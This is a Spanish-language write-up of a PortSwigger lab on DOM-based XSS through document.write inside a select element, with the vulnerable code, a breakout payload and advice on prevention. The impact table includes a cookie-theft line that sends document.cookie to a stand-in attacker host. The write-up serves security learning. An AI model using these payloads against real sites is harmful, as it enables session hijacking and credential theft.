# 🧪 DOM XSS in document.write sink using source location.search inside a select element

![Plataforma](https://img.shields.io/badge/Plataforma-PortSwigger-purple)
![Dificultad](https://img.shields.io/badge/Dificultad-Practitioner-yellow)
![Categoría](https://img.shields.io/badge/Categor%C3%ADa-DOM%20XSS-red)

## 📌 Resumen

Laboratorio de **PortSwigger Web Security Academy** que explota una vulnerabilidad
**DOM-based XSS** en la funcionalidad de **stock checker**. El JavaScript del
cliente toma el parámetro `storeId` de la URL y lo escribe en el DOM mediante
`document.write()`, dentro de un elemento `<select>`. Al no sanitizar el input,
es posible romper el contexto del `<select>` e inyectar HTML ejecutable.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Source | `location.search` → `storeId` | Input controlable |
| Sink | `document.write()` | Escritura directa al DOM |
| Contexto | Dentro de `<select>` | Hay que romperlo |
| Payload | `"></select><img src=1 onerror=alert(1)>` | ✅ Lab resuelto |

---

## 🎯 Objetivo

Realizar un ataque XSS que rompa el elemento `<select>` y ejecute `alert(1)`.

---

## 📖 Contexto: ¿Qué es DOM XSS?

A diferencia del XSS reflejado o almacenado, en el **DOM XSS** la vulnerabilidad
está en el **JavaScript del lado del cliente**. El servidor siempre devuelve el
mismo HTML; es el navegador el que, al ejecutar el JS, toma datos controlables
por el usuario y los escribe de forma insegura en el DOM.

Conceptos clave:

- **Source (fuente):** de dónde viene el dato controlable → `location.search`
  (parámetro `storeId` de la URL).
- **Sink (sumidero):** dónde se escribe el dato de forma insegura →
  `document.write()`.
- **Contexto:** dónde cae el input dentro del HTML → dentro de un `<select>`.

---

## 🔍 Análisis

### 1. Identificar la reflexión

Se añade el parámetro `storeId` a la URL de un producto:

```
https://<lab-id>.web-security-academy.net/product?productId=4&storeId=test123
```

El valor `test123` aparece reflejado en el desplegable de tiendas. ✅

### 2. Encontrar el código vulnerable

Con **DevTools** (F12) → pestaña **Elements** → **Ctrl+F** → `storeId`.

Se encuentra el siguiente JavaScript inline:

```javascript
var stores = ['London', 'Paris', 'Milan'];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
for (var i=0; i<stores.length; i++) {
    if (stores[i] === store) {
        continue;
    }
    document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>');
```

**Análisis del flujo:**

1. `store` se obtiene de `location.search` (**source**).
2. `document.write()` escribe `<select>` y `<option>` (**sink**).
3. El valor de `store` se concatena **sin sanitizar** dentro del `<option>`.

### 3. Entender el contexto

El HTML renderizado es:

```html
<select name="storeId">
    <option selected>test123</option>
    <option>London</option>
    <option>Paris</option>
    <option>Milan</option>
</select>
```

El input cae **dentro de un `<option>`**, que está **dentro de un `<select>`**.
Esto es clave: dentro de un `<select>` el navegador **solo acepta** etiquetas
`<option>` y `<optgroup>`. Si intentas meter `<script>`, se trata como texto
plano y **no se ejecuta**.

**Por lo tanto:** hay que **romper** el `<select>` primero.

---

## 💥 Explotación

### 4. Construir el payload

```
"></select><img src=1 onerror=alert(1)>
```

**Desglose:**

| Trozo | Función |
|-------|---------|
| `"` | Cierra el atributo `selected` (por si acaso). |
| `>` | Cierra la etiqueta `<option>`. |
| `</select>` | **Cierra el `<select>`** → salimos a contexto HTML normal. |
| `<img src=1 onerror=alert(1)>` | Imagen que falla al cargar → dispara `onerror` → ejecuta `alert(1)`. |

### 5. Ejecutar el ataque

URL final:

```
https://<lab-id>.web-security-academy.net/product?productId=4&storeId="></select><img src=1 onerror=alert(1)>
```

Si el navegador codifica los caracteres especiales, usar la versión URL-encoded:

```
&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
```

Al cargar la página, se ejecuta `alert(1)` y el lab se marca como **Solved**.

---

## 📸 Evidencia

<img width="1181" height="216" alt="image" src="https://github.com/user-attachments/assets/281111f3-f84d-4704-b7b6-2b919fab1546" />


✅ **Laboratorio completado.**

---

## ⚠️ ¿Por qué es peligroso en el mundo real?

El `alert(1)` es solo una prueba. En un ataque real, el atacante podría:

| Ataque | Payload ejemplo | Impacto |
|--------|-----------------|---------|
| **Robo de cookies** | `fetch('https://atacante.com/?c='+document.cookie)` | Suplantación de sesión |
| **Phishing** | Formulario falso que cubre la página | Robo de credenciales |
| **Acciones en nombre de la víctima** | `fetch('/account/transfer', {method:'POST', ...})` | Fraude, cambios de configuración |

La URL sigue siendo la del sitio legítimo, así que la víctima no sospecha.

---

## 🧠 Lecciones aprendidas

1. **DOM XSS vive en el cliente**, no en el servidor. El servidor devuelve
   siempre el mismo HTML; el fallo está en el JavaScript.
2. **Identificar source, sink y contexto** es el flujo mental para cualquier
   DOM XSS:
   - Source: `location.search`, `location.hash`, `document.referrer`.
   - Sink: `document.write`, `innerHTML`, `eval`, `setTimeout`.
   - Contexto: HTML, atributo, JS, URL.
3. **El contexto importa.** Dentro de un `<select>` no se puede inyectar
   `<script>` directamente; hay que romper el contexto primero.
4. **`document.write` con concatenación de strings** es un antipatrón de
   seguridad. Se debe usar `textContent` o `createElement` + `appendChild`.
5. **En bug bounty, `alert(1)` no basta.** Hay que demostrar impacto real
   (robo de sesión, phishing, acciones en nombre de la víctima).

---

## 🛡️ ¿Cómo se previene?

**Código vulnerable:**

```javascript
document.write('<option selected>' + store + '</option>');   // ❌
```

**Código seguro:**

```javascript
var option = document.createElement('option');
option.textContent = store;   // ✅ Trata el input como texto, no como HTML
document.querySelector('select').appendChild(option);
```

**Diferencia clave:**

- `innerHTML` / `document.write` → el navegador interpreta el input **como HTML**.
- `textContent` → el navegador lo trata **como texto plano**.

---

## 🛠️ Herramientas utilizadas

- Navegador web (DevTools → Elements)
- Burp Suite (opcional, para inspeccionar)

---

## 📚 Referencias

- [PortSwigger - DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [PortSwigger - DOM XSS in document.write sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
- [OWASP - DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-09-26
